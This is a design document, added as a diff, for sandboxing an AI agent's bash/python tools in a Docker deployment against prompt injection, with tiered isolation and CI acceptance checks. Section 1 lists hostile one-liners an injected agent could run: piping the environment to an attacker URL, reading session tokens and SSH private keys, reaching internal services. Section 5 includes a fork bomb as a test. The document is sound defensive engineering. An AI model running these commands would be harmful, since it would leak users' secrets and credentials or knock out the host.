@@ -1,0 +1,171 @@
+# Scoping: a `bash` / `python` Sandbox for the Docker Deployment
+
+**Date:** 2026-06-12
+**Context:** R-1 in `agent-tool-attack-surface.md` — the single largest residual risk after
+the mid-loop fencing (F-1) and ledger write-confinement (F-6). Those raise the bar against
+an injection *deciding* to do harm; this is the missing *second line of defense* if the
+model obeys an injection that reaches `bash`/`python`.
+
+**Deployment assumption:** Docker Compose on Docker Desktop for macOS, single admin user
+(the agent runs with full tool authority). If you ever run the **native** `start-macos.sh`
+path instead, `bash` runs directly on the host with your full user account — strictly worse,
+and none of the container controls below apply. Containerize first.
+
+---
+
+## 1. What `bash`/`python` get today (verified-in-code)
+
+From `src/tool_execution.py:720-763` + `docker-compose.yml`:
+
+| Dimension | Current state | Risk |
+|---|---|---|
+| **Process** | subprocess of uvicorn, inside the `odysseus` container, user `PUID=1000` | shares everything the app can reach |
+| **Environment** | inherits **`**os.environ`** verbatim | **`env` leaks every secret** — `OPENAI_API_KEY`, `HF_TOKEN`, `ODYSSEUS_ADMIN_PASSWORD`, `DATA_BRAVE_API_KEY`, `GOOGLE_API_KEY`, `TAVILY_API_KEY`, `SERPER_API_KEY`, `SEARXNG_SECRET` |
+| **Filesystem** | `cwd=/app/data`, `HOME=/app/data`; full container FS as user 1000 | reads/writes `sessions.json` (session tokens), `app.db`, the **ledger** (F-6 only guards the *file tools*, not bash), and the cookbook **`.ssh/` identity** (→ SSH to your remote servers) |
+| **Network** | compose network + `host.docker.internal:host-gateway` | unrestricted egress: exfil to any URL, **SSRF** to `searxng:8080` / `chromadb:8000`, host **Ollama:11434**, and the **ToufHealth bridge:8770** (24 host tools, reads WHOOP tokens) |
+| **Resources** | only a wall-clock timeout | fork bombs / memory exhaustion bounded only by time |
+
+**One-line proofs of the gap** an injected `bash` could run today:
+`env | curl -d @- https://attacker/`  ·  `cat /app/data/sessions.json`  ·
+`cat /app/.ssh/id_* `  ·  `curl host.docker.internal:8770/...` (drive the bridge).
+
+## 2. Design tension
+
+`bash`/`python` exist to be *useful* — git, tests, data wrangling on a working file. A
+sandbox must keep legitimate local compute while cutting the dangerous reaches: **secrets,
+egress, sensitive FS, internal-service/bridge reachability.** The four are separable; we can
+close them in cheap-first order.
+
+## 3. Options (increasing isolation / effort)
+
+### Tier A — In-process hardening  ✅ IMPLEMENTED *(no architecture change)*
+Done in `tool_execution.py` (`_sandbox_env`, `_AGENT_SCRATCH`, `_sandbox_preexec`); tests in
+`tests/test_bash_python_sandbox_tierA.py`. Tunable via env (`SANDBOX_RLIMIT_*`) and the
+`tool_env_passthrough` setting. Memory (`RLIMIT_AS`) is left OFF by default — virtual-address
+limits spuriously OOM numpy/pandas; real-memory capping belongs in Tier B's container cgroup.
+1. **Scrub the env** — stop passing `**os.environ`. Pass a minimal allowlist
+   (`PATH`, `HOME`, `TERM`, `LANG`, `LC_*`, `COLUMNS`, `LINES`). Kills secret exfil via `env`
+   instantly. *Highest value-to-effort in the whole doc.*
+2. **Dedicated scratch workdir** — set `cwd`/`HOME` to `/app/data/sandbox` (created, and
+   **not** the root of `data/`), so a bare `ls`/`cat` doesn't sit on `sessions.json`,
+   `app.db`, the ledger, or `.ssh`. (Doesn't *prevent* absolute-path access — that needs a
+   namespace — but removes the easy footgun and the relative-path blast radius.)
+3. **Resource caps** — `resource.setrlimit` (CPU, `RLIMIT_AS` memory, `RLIMIT_NPROC`,
+   `RLIMIT_FSIZE`) via a `preexec_fn`, plus the existing timeout.
+
+**Closes:** secret-env exfil, casual FS footguns, fork/mem bombs.
+**Does NOT close:** network egress, absolute-path FS reads, bridge reachability. Honest
+ceiling — Tier A is necessary but not sufficient.
+
+### Tier B — Sandbox-runner sidecar container  ✅ IMPLEMENTED
+Built as `docker/sandbox/` (Dockerfile + `runner.py`), the `sandbox` Compose service, the
+`src/sandbox_client.py` dispatch client, and the wiring in `tool_execution.py`. Tests:
+`tests/test_sandbox_runner.py` (end-to-end over a real Unix socket — execution, exit codes,
+timeout-kill, **secret isolation**, fail-closed). When `SANDBOX_RUNNER_SOCK` is set (default in
+compose), the agent's `bash`/`python` run **in the isolated container**; unset it to fall back
+to in-container Tier-A-hardened local execution. Key implementation decisions:
+
+- **App↔runner IPC is a Unix socket on a shared volume**, not a network call — because
+  `network_mode:none` leaves the runner with no network interfaces. Filesystem IPC works
+  regardless. (`sandbox-ipc` volume mounted in both containers.)
+- **Fail-closed**: if the runner is configured but unreachable, `bash`/`python` return an
+  error rather than silently running unconfined. `SANDBOX_FALLBACK_LOCAL=true` opts into
+  resilience-over-containment.
+- **Functional trade-off (by design)**: the sandbox sees **only its tmpfs `/work`** — not the
+  app's `data/`, workspace, or network. So `python` can't read `/app/data/...` directly; the
+  agent uses the (path-confined) `read_file` tool to fetch content and passes it inline. This
+  is the FS isolation working as intended.
+- **Runner runs as a non-root user (uid 65532).** The shared `sandbox-ipc` volume's `/ipc`
+  and `/work` mount points are created and chowned to that uid at *build* time, so when the
+  volume is first mounted (empty) Docker initialises it with that ownership — the non-root
+  runner can create the socket with no runtime chown (which `cap_drop:ALL` would forbid). The
+  app container's user connects to the 0666 socket. A runtime acceptance check asserts
+  `id -u != 0`.
+
+Original design (as built):
+
+```yaml
+  sandbox:
+    build: ./docker/sandbox          # minimal image: python + coreutils + git
+    network_mode: "none"             # NO egress, NO internal services, NO bridge
+    read_only: true                  # immutable rootfs
+    tmpfs:
+      - /work:size=512m,mode=1777    # the only writable surface (scratch)
+    cap_drop: [ALL]
+    security_opt: [no-new-privileges:true]
+    user: "65534:65534"              # nobody
+    pids_limit: 256
+    mem_limit: 512m
+    cpus: "1.0"
+    # NO bind of ./data, ./logs, .ssh; NO environment: secrets; NO extra_hosts
+```
+
+The app dispatches code over a **minimal stdin→stdout exec RPC on an internal-only socket**
+(a ~50-line server in the sandbox image). **Do NOT mount the Docker socket into the app** to
+run `docker exec` — that hands the agent host-root and is worse than the disease. Only a
+named scratch file/dir the user is actively working on gets bind-mounted into `/work`, read
+-write, nothing else.
+
+**Closes:** egress, SSRF, bridge reach, secret env, sensitive FS, resource abuse — the whole
+table. **Cost:** the agent's `bash`/`python` lose the app's data + network by default; you
+opt specific paths in.
+
+### Tier C — Egress allowlist  ✅ IMPLEMENTED (opt-in) *(only if code needs the internet)*
+Built but **off by default** — the secure default stays `network_mode:none`. Components:
+`docker/sandbox/proxy/` (a self-contained default-deny CONNECT proxy, `proxy.py` + Dockerfile)
+and the `docker-compose.sandbox-egress.yml` overlay. Enable per session:
+
+```bash
+SANDBOX_EGRESS_ALLOWLIST=pypi.org,files.pythonhosted.org,github.com \
+  docker compose -f docker-compose.yml -f docker-compose.sandbox-egress.yml up -d
+```
+
+How it stays safe (no `NET_ADMIN`, no iptables needed): the overlay uses Compose `!reset`
+(needs v2.24+) to drop `network_mode:none` and put the sandbox on an **`internal: true`**
+network — which has no route to the internet. The proxy is the only container on both that
+internal network and an egress network, so it is the **only door out**, and it opens only for
+`PROXY_ALLOWLIST` hosts (suffix match; everything else → 403; non-CONNECT → 405). The runner
+forwards `HTTP(S)_PROXY` to the child, so sandboxed `pip`/https flows through it. Allowlist
+logic is unit-tested (`tests/test_sandbox_egress_proxy.py`: allow tunnels, deny=403,
+subdomain suffix match, method reject). The proxy keeps read-only rootfs + `cap_drop:ALL` +
+non-root too. **Manual acceptance** (egress profile up): from the sandbox, `pip download` of an
+allowlisted package succeeds; a curl/urlopen to a non-allowlisted host fails.
+
+### Not recommended for this host
+- **gVisor (`runsc`)** — strong, but the `runsc` runtime isn't cleanly available under Docker
+  Desktop for macOS (its own VM). Revisit on a native Linux host.
+- **Mounting the Docker socket** to spawn per-call containers — gives the agent host-root.
+  Never do this from an agent-reachable process.
+
+## 4. Status
+
+**All three tiers are implemented; A + B are on by default, C is opt-in.**
+
+- **Tier A** (env-scrub + scratch workdir + rlimits) — `tool_execution.py`, always on.
+- **Tier B** (isolated non-root sidecar runner: network none, read-only, cap_drop ALL,
+  no data/secret mounts) — on whenever `SANDBOX_RUNNER_SOCK` is set (default in compose).
+- **Tier C** (egress allowlist proxy) — off by default; enable with the egress overlay only
+  when a workflow needs the internet. The secure default remains **no network**.
+
+CI (`sandbox-isolation` job) keeps A/B from regressing: a static compose guard plus a runtime
+acceptance run, and the Tier-C proxy allowlist is unit-tested.
+
+## 5. Acceptance checks (how we'll know it works)
+
+**Enforced in CI** — the `sandbox-isolation` job (`.github/workflows/ci.yml`) runs on every
+PR: a static guard (`scripts/check_sandbox_compose.py`) fails if the sandbox service drops any
+isolation flag or gains a sensitive mount/secret, and a runtime check builds the image, runs
+it with the hardened flags, and drives `scripts/sandbox_acceptance.py` from a sibling
+container to prove the guarantees below actually hold. So the isolation can't silently regress.
+
+- `env` inside the agent's `bash` shows **no** API key / admin password (A).
+- `cat /app/data/sessions.json` from the agent's `bash` **fails** (B; A moves the cwd only).
+- `curl https://example.com` and `curl host.docker.internal:8770` from the agent's `bash`
+  **fail** (B).
+- `:(){ :|:& };:` and a 2 GB allocation are killed by limits, not by hanging the host (A).
+- Legitimate `git status`, `python -c "print(1+1)"`, and processing a user file mounted into
+  `/work` still **work** (A + B).
+
+## 6. Out of scope here
+Network-level SSRF for the *server itself* (R-2, `base_url`) and content-aware provenance
+(R-3) are tracked separately in `agent-tool-attack-surface.md`.
